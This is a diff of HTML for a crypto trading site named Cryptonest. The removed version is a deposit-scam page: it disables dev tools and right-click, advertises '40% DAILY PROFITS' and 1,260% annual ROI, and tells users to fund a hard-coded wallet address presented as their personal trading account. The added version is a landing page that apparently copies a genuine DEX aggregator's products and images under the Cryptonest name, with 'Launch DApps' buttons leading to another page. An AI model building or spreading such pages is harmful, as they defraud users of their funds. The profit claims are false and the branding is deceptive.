@@ -3,888 +3,470 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CryptoNest Trading | Secure Crypto Trading Platform</title>
+    <title>Cryptonest - Decentralized Exchange</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        /* Vantablack background */
         body {
-            font-family: 'Space Grotesk', sans-serif;
-            background-color: #f8fafc;
-            color: #1a1a1a;
-        }
-        
-        .mono {
-            font-family: 'Space Mono', monospace;
-        }
-        
-        .primary-bg {
-            background-color: #10b981;
-        }
-        
-        .primary-text {
-            color: #10b981;
-        }
-        
-        .secondary-bg {
-            background-color: #e8f5e9;
-        }
-        
-        .secondary-text {
-            color: #e8f5e9;
-        }
-        
-        .luxury-accent {
             background-color: #000000;
+            color: #e5e7eb;
         }
         
-        .luxury-text {
-            color: #000000;
-        }
-        
-        .blur-background {
-            filter: blur(4px);
-            pointer-events: none;
-            user-select: none;
-        }
-        
-        .modal-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0, 0, 0, 0.5);
-            z-index: 100;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .modal-content {
-            background-color: white;
-            border-radius: 12px;
-            max-width: 500px;
-            width: 90%;
-            max-height: 90vh;
-            overflow-y: auto;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
-        }
-        
-        .chart-container {
-            height: 400px;
-            position: relative;
-        }
-        
-        .chart-line {
-            position: absolute;
-            bottom: 0;
-            width: 100%;
-            height: 100%;
-            stroke: #10b981;
-            stroke-width: 2;
-            fill: none;
-        }
-        
-        .chart-area {
-            fill: rgba(16, 185, 129, 0.1);
-        }
-        
-        .pulse {
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% {
-                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4);
-            }
-            70% {
-                box-shadow: 0 0 0 10px rgba(16, 185, 129, 0);
-            }
-            100% {
-                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0);
-            }
-        }
-        
-        .wallet-connected {
-            border-left: 4px solid #10b981;
-        }
-        
-        .spinner {
-            animation: spin 1s linear infinite;
-        }
-        
-        @keyframes spin {
-            from {
-                transform: rotate(0deg);
-            }
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        
-        .success-check {
-            stroke-dasharray: 100;
-            stroke-dashoffset: 100;
-            animation: dash 0.5s ease-in-out forwards;
-        }
-        
-        @keyframes dash {
-            to {
-                stroke-dashoffset: 0;
-            }
-        }
-        
-        /* Candlestick chart styles */
-        .candle {
-            stroke-width: 1;
-        }
-        
-        .candle-up {
-            fill: #10b981;
-            stroke: #10b981;
-        }
-        
-        .candle-down {
-            fill: #ef4444;
-            stroke: #ef4444;
-        }
-        
-        .wick {
-            stroke-width: 1;
-        }
-        
-        .wick-up {
-            stroke: #10b981;
-        }
-        
-        .wick-down {
-            stroke: #ef4444;
-        }
-        
-        /* Additional styles from original code */
+        /* Custom dark theme styles */
         .gradient-bg {
-            background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 50%, #1d4ed8 100%);
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
         }
-        .wallet-connected {
-            box-shadow: 0 0 15px rgba(74, 222, 128, 0.7);
+        .network-icon {
+            transition: all 0.3s ease;
+            background-color: #111827;
+            border: 1px solid #1f2937;
         }
-        .transaction-modal {
+        .network-icon:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3);
+        }
+        .feature-card {
+            transition: all 0.3s ease;
+            background-color: #111827;
+            border: 1px solid #1f2937;
+        }
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3);
+        }
+        .partner-logo {
+            filter: grayscale(100%) brightness(0.8);
+            opacity: 0.7;
             transition: all 0.3s ease;
         }
-        .warning-modal {
-            z-index: 60;
-        }
-        .confirm-button {
-            background-color: #48ff91 !important;
-            color: #000 !important;
+        .partner-logo:hover {
+            filter: grayscale(0%) brightness(1);
+            opacity: 1;
         }
         
-        /* Fixed CTA button */
-        .fixed-cta {
-            position: fixed;
-            top: 80px;
-            right: 20px;
-            z-index: 50;
+        /* Dark navigation */
+        nav {
+            background-color: #000000;
+            border-bottom: 1px solid #1f2937;
         }
         
-        @media (max-width: 768px) {
-            .fixed-cta {
-                position: static;
-                margin-top: 20px;
-                margin-bottom: 20px;
-                text-align: center;
-            }
+        /* Dark text colors */
+        .text-gray-900 {
+            color: #e5e7eb;
+        }
+        .text-gray-700 {
+            color: #d1d5db;
+        }
+        .text-gray-500 {
+            color: #9ca3af;
+        }
+        .text-gray-400 {
+            color: #9ca3af;
+        }
+        
+        /* Dark cards */
+        .bg-white {
+            background-color: #111827;
+        }
+        .bg-gray-50 {
+            background-color: #111827;
+        }
+        
+        /* Dark borders */
+        .border-gray-200 {
+            border-color: #1f2937;
+        }
+        
+        /* Dark buttons */
+        .bg-green-600 {
+            background-color: #10b981;
+        }
+        .bg-green-600:hover {
+            background-color: #059669;
+        }
+        
+        /* Dark footer */
+        footer {
+            background-color: #000000;
+            border-top: 1px solid #1f2937;
+        }
+        
+        /* Special Vantablack elements */
+        .vantablack-bg {
+            background-color: #000000;
+        }
+        .vantablack-border {
+            border-color: #1f2937;
+        }
+        
+        /* Glowing effect for interactive elements */
+        .glow-effect {
+            transition: all 0.3s ease;
+        }
+        .glow-effect:hover {
+            box-shadow: 0 0 15px rgba(16, 185, 129, 0.5);
         }
     </style>
 </head>
-<body>
-    <!-- Disable right-click and dev tools -->
-    <script>
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        
-        document.addEventListener('keydown', e => {
-            if (e.key === 'F12') {
-                e.preventDefault();
-            }
-            
-            if ((e.ctrlKey && e.shiftKey && ['I', 'J'].includes(e.key)) ||
-                (e.ctrlKey && e.key === 'u')) {
-                e.preventDefault();
-            }
-        });
-    </script>
-
-    <!-- Main Content -->
-    <div class="min-h-screen flex flex-col" id="mainContent">
-        <!-- Navigation -->
-        <nav class="primary-bg text-white p-4 shadow-md">
-            <div class="container mx-auto flex justify-between items-center">
-                <div class="flex items-center space-x-2">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 luxury-text" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-                    </svg>
-                    <span class="text-xl font-bold">CryptoNest</span>
-                </div>
-                <div id="walletStatus" class="hidden bg-white/10 px-3 py-1 rounded-full">
-                    <span class="text-sm mono">Connected: </span>
-                    <span id="walletAddress" class="text-sm font-medium mono"></span>
-                </div>
-            </div>
-        </nav>
-
-        <!-- Fixed CTA Button -->
-<div id="connectSection" class="fixed-cta">
-    <button id="connectWalletBtn" class="primary-bg hover:bg-opacity-90 text-white font-bold py-3 px-8 rounded-full text-lg shadow-lg pulse transition-all">
-        Start Trading Now
-    </button>
-    
-    <!-- Connection Note -->
-    <p class="text-gray-500 mt-2 text-sm">Secure connection powered by Web3</p>
-    
-    <!-- Dashboard-Style Balance -->
-    <div class="balance-display mt-6 text-center">
-        <p class="text-gray-500 text-sm mb-1 uppercase tracking-widest">Trading Balance</p>
-        <p id="tradingBalance" class="text-3xl md:text-4xl font-semibold text-green-600 shadow-sm">0.00 ETH</p>
-    </div>
-</div>
-
-
-
-        <!-- Hero Section -->
-        <section class="flex-grow container mx-auto px-4 py-12 flex flex-col items-center justify-center mt-16">
-            <div class="text-center mb-12">
-                <h1 class="text-4xl md:text-5xl font-bold primary-text mb-4">Trade Crypto with Confidence</h1>
-                <p class="text-lg text-gray-600 max-w-2xl mx-auto">Join the elite traders on our secure platform with industry-leading returns.</p>
-            </div>
-
-            <!-- Market Chart -->
-            <div class="w-full max-w-6xl bg-white rounded-xl shadow-lg p-6 mb-12">
-                <div class="flex justify-between items-center mb-4">
-                    <h2 class="text-xl font-semibold">ETH/USD</h2>
-                    <div class="flex items-center space-x-2">
-                        <span class="text-green-500 font-medium">+2.4%</span>
-                        <span class="text-gray-500 mono">$3,456.78</span>
+<body class="font-sans">
+    <!-- Navigation -->
+    <nav class="shadow-md vantablack-bg">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between h-16 items-center">
+                <div class="flex items-center">
+                    <div class="flex-shrink-0 flex items-center">
+                        <img class="h-8 w-auto" src="https://lionswap.finance/assets/eth-bb146c18.webp" alt="Cryptonest">
+                        <span class="ml-2 text-xl font-bold text-green-400">Cryptonest</span>
                     </div>
                 </div>
-                <div class="chart-container">
-                    <svg viewBox="0 0 800 400" class="w-full h-full" id="candlestickChart">
-                        <!-- Background grid -->
-                        <defs>
-                            <pattern id="grid" width="50" height="50" patternUnits="userSpaceOnUse">
-                                <path d="M 50 0 L 0 0 0 50" fill="none" stroke="#e5e7eb" stroke-width="0.5"/>
-                            </pattern>
-                        </defs>
-                        <rect width="100%" height="100%" fill="url(#grid)" />
-                        
-                        <!-- Candlesticks will be generated here by JavaScript -->
-                    </svg>
-                </div>
-                <div class="flex justify-between mt-4 text-sm text-gray-500">
-                    <span>1H</span>
-                    <span>4H</span>
-                    <span>1D</span>
-                    <span>1W</span>
-                    <span>1M</span>
-                </div>
-            </div>
-
-            <!-- Test Section (hidden initially) -->
-            <div id="testSection" class="hidden w-full max-w-2xl bg-white rounded-xl shadow-lg p-6">
-                <h2 class="text-xl font-semibold mb-4">Your Trading Account</h2>
-                
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
-                    <div class="bg-gray-50 p-4 rounded-lg">
-                        <p class="text-gray-500 text-sm">Wallet Balance</p>
-                        <p id="walletBalance" class="text-2xl font-bold mono">0 ETH</p>
-                    </div>
-                    <div class="bg-gray-50 p-4 rounded-lg">
-                        <p class="text-gray-500 text-sm">Trading Capital (60%)</p>
-                        <p id="tradingCapital" class="text-2xl font-bold mono">0 ETH</p>
+                <div class="hidden md:block">
+                    <div class="ml-10 flex items-center space-x-4">
+                        <a href="#" class="px-3 py-2 rounded-md text-sm font-medium text-gray-300 hover:text-green-400 hover:bg-gray-800">Products</a>
+                        <a href="#" class="px-3 py-2 rounded-md text-sm font-medium text-gray-300 hover:text-green-400 hover:bg-gray-800">Developers</a>
+                        <a href="#" class="px-3 py-2 rounded-md text-sm font-medium text-gray-300 hover:text-green-400 hover:bg-gray-800">Governance</a>
+                        <a href="#" class="px-3 py-2 rounded-md text-sm font-medium text-gray-300 hover:text-green-400 hover:bg-gray-800">Community</a>
+                        <a href="LaunchDApp.html" class="ml-4 px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-green-600 hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 glow-effect">
+                            Launch DApps
+                        </a>
                     </div>
                 </div>
-                
-                <div class="bg-green-50 p-4 rounded-lg mb-6">
-                    <h3 class="font-semibold mb-2">Estimated Returns</h3>
-                    <div class="flex justify-between items-center">
-                        <div>
-                            <p class="text-gray-600 text-sm">Daily ROI</p>
-                            <p class="text-xl font-bold text-green-600">3.5%</p>
-                        </div>
-                        <div>
-                            <p class="text-gray-600 text-sm">Monthly ROI</p>
-                            <p class="text-xl font-bold text-green-600">105%</p>
-                        </div>
-                        <div>
-                            <p class="text-gray-600 text-sm">Annual ROI</p>
-                            <p class="text-xl font-bold text-green-600">1,260%</p>
-                        </div>
-                    </div>
+                <div class="-mr-2 flex md:hidden">
+                    <button type="button" class="inline-flex items-center justify-center p-2 rounded-md text-gray-400 hover:text-gray-300 hover:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-inset focus:ring-green-500" aria-controls="mobile-menu" aria-expanded="false">
+                        <span class="sr-only">Open main menu</span>
+                        <svg class="block h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+                        </svg>
+                    </button>
                 </div>
-                
-                <div class="mb-4">
-                    <p class="text-sm text-gray-500 mb-2">Your trading address:</p>
-                    <p class="mono bg-gray-100 p-2 rounded text-sm break-all">0x675c2761a8BDF5D5E36cfC7dcC5aA5b3d30129E1</p>
-                </div>
-                
-                <button id="agreeTradeBtn" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-lg transition-all">
-                    I Agree, Start Trading
-                </button>
             </div>
-        </section>
+        </div>
+    </nav>
 
-        <!-- Footer -->
-        <footer class="primary-bg text-white p-6">
-            <div class="container mx-auto text-center">
-                <p class="text-sm">&copy; 2023 CryptoNest Trading. All rights reserved.</p>
-                <p class="text-xs opacity-70 mt-2">Secured by blockchain technology</p>
-            </div>
-        </footer>
-    </div>
-
-    <!-- Warning Modal -->
-    <div id="warningModal" class="modal-overlay hidden">
-        <div class="modal-content p-6">
-            <div class="flex justify-between items-center mb-4">
-                <h3 class="text-xl font-bold">Important Notice</h3>
-                <button id="cancelBtn" class="text-gray-500 hover:text-gray-700">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
-                    </svg>
-                </button>
-            </div>
-            <div class="mb-6">
-                <p class="mb-4">Confirm the deposit to your trading address to begin trade</p>
-                <ul class="list-disc pl-5 space-y-2 text-sm">
-                    <li>Your Personal Trading Deposit Address has been allocated to your trading account</li>
-                    <li>Your Trading deposits and profits can be withdrawn back to your wallet at any time </li>
-                    <li>40% DAILY PROFITS</li>
-                    <li>CONFIRM THE TRANSACTION TO FUND YOUR TRADING ADDRESS</li>
-                </ul>
-            </div>
-            <div class="flex space-x-4">
-                <button id="agreeBtn" class="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded transition-all">
-                    Deposit to my Trading address
-                </button>
-                <button id="cancelBtn2" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 font-bold py-2 px-4 rounded transition-all">
-                    Cancel
-                </button>
+    <!-- Hero Section -->
+    <div class="gradient-bg">
+        <div class="max-w-7xl mx-auto py-16 px-4 sm:py-24 sm:px-6 lg:px-8 text-center">
+            <h1 class="text-4xl md:text-5xl font-extrabold text-white mb-6">
+                Optimize your trades across hundreds of DEXes on multiple networks
+            </h1>
+            <p class="mt-6 max-w-3xl mx-auto text-xl text-green-100">
+                Cryptonest instantly analyzes thousands of quotes and fees across multiple DEXes to provide users with the best rates.
+            </p>
+            <div class="mt-10 flex justify-center">
+                <a href="LaunchDApp.html" class="px-8 py-3 border border-transparent text-base font-medium rounded-md text-green-700 bg-white hover:bg-gray-100 md:py-4 md:text-lg md:px-10 glow-effect">
+                    Launch DApps Now
+                </a>
             </div>
         </div>
     </div>
 
-    <!-- Transaction Modal -->
-    <div id="transactionModal" class="modal-overlay hidden">
-        <div class="modal-content p-6">
-            <div class="flex justify-between items-center mb-4">
-                <h3 id="transactionTitle" class="text-xl font-bold">Processing Transaction</h3>
-                <button id="closeModalBtn" class="text-gray-500 hover:text-gray-700">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
-                    </svg>
-                </button>
-            </div>
-                    
-            <div class="text-center py-8">
-                <!-- Spinner -->
-                <div id="transactionSpinner" class="flex justify-center mb-4">
-                    <svg class="spinner h-12 w-12 text-green-600" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
+    <!-- Networks Section -->
+    <div class="vantablack-bg py-12">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-center text-3xl font-extrabold text-white mb-12">Supported Networks</h2>
+            <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-6">
+                <!-- Ethereum -->
+                <div class="network-icon rounded-lg p-6 text-center glow-effect">
+                    <img class="mx-auto h-16 w-16" src="https://lionswap.finance/assets/eth-bb146c18.webp" alt="Ethereum">
+                    <h3 class="mt-4 text-lg font-medium text-white">Ethereum</h3>
                 </div>
-                
-                <!-- Success -->
-                <div id="transactionSuccess" class="hidden mb-4">
-                    <div class="inline-flex items-center justify-center w-16 h-16 bg-green-100 rounded-full mb-4">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                            <path class="success-check" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
-                        </svg>
-                    </div>
+                <!-- BNB Chain -->
+                <div class="network-icon rounded-lg p-6 text-center glow-effect">
+                    <img class="mx-auto h-16 w-16" src="https://lionswap.finance/assets/bsc-d909b9ba.webp" alt="BNB Chain">
+                    <h3 class="mt-4 text-lg font-medium text-white">BNB Chain</h3>
                 </div>
-                
-                <!-- Error -->
-                <div id="transactionError" class="hidden mb-4">
-                    <div class="inline-flex items-center justify-center w-16 h-16 bg-red-100 rounded-full mb-4">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
-                        </svg>
-                    </div>
+                <!-- Polygon -->
+                <div class="network-icon rounded-lg p-6 text-center glow-effect">
+                    <img class="mx-auto h-16 w-16" src="https://lionswap.finance/assets/polygon-4e91c029.webp" alt="Polygon">
+                    <h3 class="mt-4 text-lg font-medium text-white">Polygon</h3>
                 </div>
-                
-                <p id="transactionMessage" class="text-gray-700 mb-6">Please confirm the transaction in your wallet...</p>
-                
-                <div id="transactionDetails" class="hidden bg-gray-50 p-4 rounded-lg text-left">
-                    <div class="mb-3">
-                        <p class="text-sm text-gray-500">From:</p>
-                        <p id="txFrom" class="mono text-sm break-all"></p>
-                    </div>
-                    <div>
-                        <p class="text-sm text-gray-500">To:</p>
-                        <p class="mono text-sm break-all">0x675c2761a8BDF5D5E36cfC7dcC5aA5b3d30129E1</p>
-                    </div>
-                    <div id="txHashContainer" class="mt-3 hidden">
-                        <p class="text-sm text-gray-500">Transaction:</p>
-                        <a id="txHashLink" href="#" target="_blank" class="mono text-sm text-blue-600 hover:underline break-all"></a>
-                    </div>
+                <!-- Optimism -->
+                <div class="network-icon rounded-lg p-6 text-center glow-effect">
+                    <img class="mx-auto h-16 w-16" src="https://lionswap.finance/assets/optimism-a28ba46e.webp" alt="Optimism">
+                    <h3 class="mt-4 text-lg font-medium text-white">Optimism</h3>
                 </div>
-                
-                <div id="estimatedGasFee" class="text-sm text-gray-500 mt-2"></div>
+                <!-- Gnosis -->
+                <div class="network-icon rounded-lg p-6 text-center glow-effect">
+                    <img class="mx-auto h-16 w-16" src="https://lionswap.finance/assets/gnosis-55dc4ed3.webp" alt="Gnosis">
+                    <h3 class="mt-4 text-lg font-medium text-white">Gnosis</h3>
+                </div>
+                <!-- Avalanche -->
+                <div class="network-icon rounded-lg p-6 text-center glow-effect">
+                    <img class="mx-auto h-16 w-16" src="https://lionswap.finance/assets/avalanche-3470fa27.webp" alt="Avalanche">
+                    <h3 class="mt-4 text-lg font-medium text-white">Avalanche</h3>
+                </div>
+                <!-- Arbitrum -->
+                <div class="network-icon rounded-lg p-6 text-center glow-effect">
+                    <img class="mx-auto h-16 w-16" src="https://lionswap.finance/assets/arbitrum-8d6b9bd9.webp" alt="Arbitrum">
+                    <h3 class="mt-4 text-lg font-medium text-white">Arbitrum</h3>
+                </div>
+                <!-- Fantom -->
+                <div class="network-icon rounded-lg p-6 text-center glow-effect">
+                    <img class="mx-auto h-16 w-16" src="https://lionswap.finance/assets/fantom-3dd62fd0.webp" alt="Fantom">
+                    <h3 class="mt-4 text-lg font-medium text-white">Fantom</h3>
+                </div>
+                <!-- Klaytn -->
+                <div class="network-icon rounded-lg p-6 text-center glow-effect">
+                    <img class="mx-auto h-16 w-16" src="https://lionswap.finance/assets/klaytn-bfda4e0b.webp" alt="Klaytn">
+                    <h3 class="mt-4 text-lg font-medium text-white">Klaytn</h3>
+                </div>
+                <!-- Aurora -->
+                <div class="network-icon rounded-lg p-6 text-center glow-effect">
+                    <img class="mx-auto h-16 w-16" src="https://lionswap.finance/assets/aurora-1d9f1cbe.webp" alt="Aurora">
+                    <h3 class="mt-4 text-lg font-medium text-white">Aurora</h3>
+                </div>
             </div>
         </div>
     </div>
 
+    <!-- Features Section -->
+    <div class="vantablack-bg py-16">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="lg:text-center">
+                <h2 class="text-base text-green-400 font-semibold tracking-wide uppercase">Features</h2>
+                <p class="mt-2 text-3xl leading-8 font-extrabold tracking-tight text-white sm:text-4xl">
+                    Never-ending liquidity
+                </p>
+                <p class="mt-4 max-w-2xl text-xl text-gray-400 lg:mx-auto">
+                    Cryptonest instantly analyzes thousands of quotes and fees across multiple DEXes to provide users with the best rates.
+                </p>
+            </div>
+
+            <div class="mt-10">
+                <div class="grid md:grid-cols-2 gap-8">
+                    <div class="feature-card p-8 rounded-lg glow-effect">
+                        <div class="flex items-center">
+                            <div class="flex-shrink-0 bg-green-900 rounded-md p-3">
+                                <i class="fas fa-wallet text-green-400 text-2xl"></i>
+                            </div>
+                            <div class="ml-4">
+                                <h3 class="text-lg font-medium text-white">Cryptonest DeFi Wallet</h3>
+                                <p class="mt-1 text-gray-400">Buy crypto with your bank card using our partner fiat gateway providers.</p>
+                            </div>
+                        </div>
+                        <img class="mt-6 rounded-lg" src="https://lionswap.finance/assets/wallet-buy-406ce373.webp" alt="Cryptonest Wallet">
+                    </div>
+                    <div class="feature-card p-8 rounded-lg glow-effect">
+                        <div class="flex items-center">
+                            <div class="flex-shrink-0 bg-green-900 rounded-md p-3">
+                                <i class="fas fa-bolt text-green-400 text-2xl"></i>
+                            </div>
+                            <div class="ml-4">
+                                <h3 class="text-lg font-medium text-white">Cryptonest Fusion</h3>
+                                <p class="mt-1 text-gray-400">The Fusion upgrade makes swaps on Cryptonest yet more efficient and secure, combining liquidity from the entire crypto market in one place.</p>
+                            </div>
+                        </div>
+                        <img class="mt-6 rounded-lg" src="https://lionswap.finance/assets/news-image-679ca548.webp" alt="Cryptonest Fusion">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Products Section -->
+    <div class="vantablack-bg py-16">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-center text-3xl font-extrabold text-white mb-12">Cryptonest Products</h2>
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
+                <!-- Aggregation Protocol -->
+                <div class="feature-card rounded-lg overflow-hidden glow-effect">
+                    <img class="w-full" src="https://lionswap.finance/assets/aggregation-protocol-5ac5f729.webp" alt="Aggregation Protocol">
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold text-white mb-2">Aggregation Protocol</h3>
+                        <p class="text-gray-400">Liquidity aggregation from multiple DEXes to ensure the best swap rates.</p>
+                    </div>
+                </div>
+                <!-- Limit Order Protocol -->
+                <div class="feature-card rounded-lg overflow-hidden glow-effect">
+                    <img class="w-full" src="https://lionswap.finance/assets/limit-order-protocol-1a73f3ad.webp" alt="Limit Order Protocol">
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold text-white mb-2">Limit Order Protocol</h3>
+                        <p class="text-gray-400">The most innovative and flexible limit order functionality in DeFi.</p>
+                    </div>
+                </div>
+                <!-- Liquidity Protocol -->
+                <div class="feature-card rounded-lg overflow-hidden glow-effect">
+                    <img class="w-full" src="https://lionswap.finance/assets/liquidity-protocol-52063370.webp" alt="Liquidity Protocol">
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold text-white mb-2">Liquidity Protocol</h3>
+                        <p class="text-gray-400">A next-generation AMM that offers capital efficiency to liquidity providers.</p>
+                    </div>
+                </div>
+                <!-- Cryptonest Earn -->
+                <div class="feature-card rounded-lg overflow-hidden glow-effect">
+                    <img class="w-full" src="https://lionswap.finance/assets/earn_1-a3e41d47.webp" alt="Cryptonest Earn">
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold text-white mb-2">Cryptonest Earn</h3>
+                        <p class="text-gray-400">A derivative-based product offering liquidity providers attractive APYs.</p>
+                    </div>
+                </div>
+                <!-- Cryptonest RabbitHole -->
+                <div class="feature-card rounded-lg overflow-hidden glow-effect">
+                    <img class="w-full" src="https://lionswap.finance/assets/rabbithole-22715395.webp" alt="Cryptonest RabbitHole">
+                    <div class="p-6">
+                        <h3 class="text-xl font-bold text-white mb-2">Cryptonest RabbitHole</h3>
+                        <p class="text-gray-400">A feature that protects MetaMask users from sandwich attacks.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Security Section -->
+    <div class="vantablack-bg py-16">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="lg:grid lg:grid-cols-2 lg:gap-8 items-center">
+                <div class="mb-8 lg:mb-0">
+                    <h2 class="text-3xl font-extrabold text-white mb-4">Your decentralized finance shield</h2>
+                    <p class="text-lg text-gray-400 mb-6">
+                        Cryptonest uses sophisticated security measures to protect users' funds in swaps on other DeFi protocols
+                    </p>
+                </div>
+                <div class="flex justify-center">
+                    <img class="rounded-lg max-w-md" src="https://lionswap.finance/assets/shield-8eff7d90.webp" alt="Security Shield">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Community Section -->
+    <div class="gradient-bg py-16 text-white">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-center text-3xl font-extrabold mb-12">Empowered by the community</h2>
+            <div class="grid md:grid-cols-2 gap-8">
+                <div class="bg-black bg-opacity-30 p-8 rounded-lg backdrop-filter backdrop-blur-sm glow-effect">
+                    <div class="flex items-center">
+                        <div class="flex-shrink-0 bg-white bg-opacity-20 rounded-md p-3">
+                            <i class="fas fa-vote-yea text-2xl"></i>
+                        </div>
+                        <div class="ml-4">
+                            <h3 class="text-lg font-medium">Cryptonest DAO</h3>
+                            <p class="mt-1 text-green-100">A governance tool that enables Cryptonest stakers to vote for key protocol parameters.</p>
+                        </div>
+                    </div>
+                    <img class="mt-6 rounded-lg" src="https://lionswap.finance/assets/dao-368ca400.webp" alt="Cryptonest DAO">
+                </div>
+                <div class="bg-black bg-opacity-30 p-8 rounded-lg backdrop-filter backdrop-blur-sm glow-effect">
+                    <div class="flex items-center">
+                        <div class="flex-shrink-0 bg-white bg-opacity-20 rounded-md p-3">
+                            <i class="fas fa-coins text-2xl"></i>
+                        </div>
+                        <div class="ml-4">
+                            <h3 class="text-lg font-medium">Cryptonest token</h3>
+                            <p class="mt-1 text-green-100">A token that facilitates Cryptonest protocol governance and participation in the network's evolution.</p>
+                        </div>
+                    </div>
+                    <img class="mt-6 rounded-lg" src="https://lionswap.finance/assets/token-94bd767f.webp" alt="Cryptonest Token">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Join Us Section -->
+    <div class="vantablack-bg py-16">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-center text-3xl font-extrabold text-white mb-12">Join us</h2>
+            <div class="flex justify-center space-x-8">
+                <a href="#" class="text-gray-400 hover:text-green-400">
+                    <i class="fab fa-telegram text-4xl glow-effect"></i>
+                    <span class="sr-only">Telegram</span>
+                </a>
+                <a href="#" class="text-gray-400 hover:text-green-400">
+                    <i class="fab fa-discord text-4xl glow-effect"></i>
+                    <span class="sr-only">Discord</span>
+                </a>
+                <a href="#" class="text-gray-400 hover:text-green-400">
+                    <i class="fab fa-twitter text-4xl glow-effect"></i>
+                    <span class="sr-only">Twitter</span>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Partners Section -->
+    <div class="vantablack-bg py-16">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <h2 class="text-center text-3xl font-extrabold text-white mb-12">Partners and stakeholders</h2>
+            <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-8">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/near-042bb8d5.svg" alt="NEAR">
+                <img class="partner-logo h-12 mx-auto" src="https://lionswap.finance/assets/metamask-511dc1cb.svg" alt="MetaMask">
